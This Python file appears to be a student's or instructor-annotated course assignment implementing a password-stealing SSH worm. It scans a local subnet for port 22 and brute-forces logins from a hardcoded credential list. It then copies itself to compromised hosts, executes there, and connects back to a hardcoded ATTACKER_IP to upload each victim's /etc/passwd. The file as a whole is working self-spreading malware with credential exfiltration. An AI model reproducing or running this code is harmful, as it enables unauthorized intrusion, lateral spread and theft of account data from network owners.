import paramiko
import sys
import socket
import nmap
import os
import sys
import netifaces
import fcntl, struct

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

# MIG: Added these
ATTACKER_IP = "192.168.1.9"
ATTACKER_USER_NAME ="mike"
ATTACKER_PASSWORD = "1234"


##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	try:
		print("checking for infected.txt")
		f=open("/tmp/infected.txt")
		f.close()
	except IOError:
		print ("system not yet infected")
		return False
	return True

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	print("inside markInfected")
	infect = open("/tmp/infected.txt","w")
	infect.write("system has been infect")
	infect.close()

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
		
		
	# MIG: Create an instance of the SFTP client
	sftpClient = sshClient.open_sftp()
	print(sshClient)
	
	print("****************inside the spreadAndExecute***********")
	# MIG: Changed this one to the SFTP client
	# MIG2: You need to change these to passwordthief_worm.py
	sftpClient.put("/tmp/password.py", "/tmp/"+"password.py")
	sshClient.exec_command("python /tmp/password.py 2> /tmp/log.txt")
	#sshClient.exec_command("python /tmp/log.txt")
	
		
    	#################################################################################
	#copy attack system
	#remotepath = '/etc/passwd'
        #localpath = '/home/passwd_'+Ipaddress
        #sshClient.get(remotepath, localpath)
	





############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(inHost, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	    
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	
	print "Username: ", userName, "Password: ", password
	
	try:
		sshClient.connect(inHost, username = userName, password = password)
		print("Got him!", inHost,userName, password)

	# MIG: Removed this
	#return 1 if wrong credentials
	#except paramiko.AuthenticationException:
	#	return 1
	except paramiko.SSHException:
		print "Wrong credentials!"
		return 1
	#MIG: Added this: The system is either not running SSH, is down, etc
	except socket.error:
		print "This SSH server has issues or is not running..."
		return 3
	return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host,Ip):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		print "Attacking "+ host+ "From "+ Ip
		value = tryCredentials(host, username, password, ssh)
		print "From the tryCredentials..."	
		if value == 0:
			print("successfully compromised")
			return(ssh, username, password)
		elif value == 1:
			print("wrong credentials")
		elif value == 3:
			print("connection failed")
			
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	#MIG2: Replaced this with the version in replicator_worm.py
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	#MIG: Fixed this; you need to first specify a list of interfaces
	interfaceList = netifaces.interfaces()
	
		
	for netFace in interfaceList:
		#Ip address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr']

		#get the IP address
		#MIG: Typo: should be 127.0.0.1
		#if not addr == "127.0.01":
		if not addr == "127.0.0.1":
			#save IP addr and break
			ipAddr = addr
			break
	return ipAddr
#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
		
	return liveHosts

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	if isInfectedSystem() == True:
		print("system infected already")
		exit()
	# MIG: we just landed on a victim that is not infected.
	# Let's mark it.
	else:
		markInfected()
		
		
    
		# MIG2 Added this:############################################
		
		# Create an instance of the SSH client
		sshBack = paramiko.SSHClient()

		# Set some parameters to make things easier.
		sshBack.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
		#try:
			# Connect back to the attacker
		sshBack.connect(ATTACKER_IP, username = ATTACKER_USER_NAME, password = ATTACKER_PASSWORD)
		
		# Open the connection back to the attacker
		sftpBack = sshBack.open_sftp()
		
				
		# The paths
		localpath = '/etc/passwd'
		remotepath = '/tmp/passwd' + getMyIP('')
		
		# Upload the password file
		sftpBack.put(localpath, remotepath)

		
		#except:
		print "Could not connect back to the attacker!"
	
# TODO: Get the IP of the current system
interface = netifaces.interfaces()

systemIP = unicode(getMyIP(interface),"utf-8")
print("System IP is " + systemIP )

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()
HostToAttck = []
temp=[]



print "System in this network is : ",networkHosts

for i,j in enumerate(networkHosts):
	if networkHosts[i] != systemIP:
		HostToAttck.append( networkHosts[i])
	#Try to attack this host
print "Found hosts: To attack", HostToAttck

print "&&&&&&&&&&&&&&&&", getMyIP('')

# Go through the network hosts
for host in HostToAttck:
	systemIP = unicode(getMyIP(interface),"utf-8")
	
	# Try to attack this host
	sshInfo =  attackSystem(host,systemIP)
	
	print sshInfo
	
	temp1 = 0
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		
		# TODO: Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		# try:
        	#	 remotepath = '/tmp/infected.txt'
		#        localpath = '/home/cpsc/'
		#	 # Copy the file from the specified
		#	 # remote path to the specified
		# 	 # local path. If the file does exist
		#	 # at the remote path, then get()
		# 	 # will throw IOError exception
		# 	 # (that is, we know the system is
		# 	 # not yet infected).
		# 
		#        sftp.get(filepath, localpath)
		# except IOError:
		#       print "This system should be infected"
		#
		#
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
		print("before if statement")
			
		#if isInfectedSystem() == False:
		# Check if the system already contains a file
		# MIG: check if the remote system already contains
		# infected.txt
		# To do that, you need an instance of the sftp client. 
		# not SSH.
		sftpClient = sshInfo[0].open_sftp()

		try:
			# MIG: Check if the /tmp/infected.txt file
			# already exists at the remote system.
			# If the file does not exist, this will
			# throw an exception.
			sftpClient.stat("/tmp/infected.txt")
			print "The remote system ", sshInfo,  " already contains the infected.txt file"
		except:
			print("We are going to spread ")
			temp1=spreadAndExecute(sshInfo[0])
	if temp1==1:
		exit()

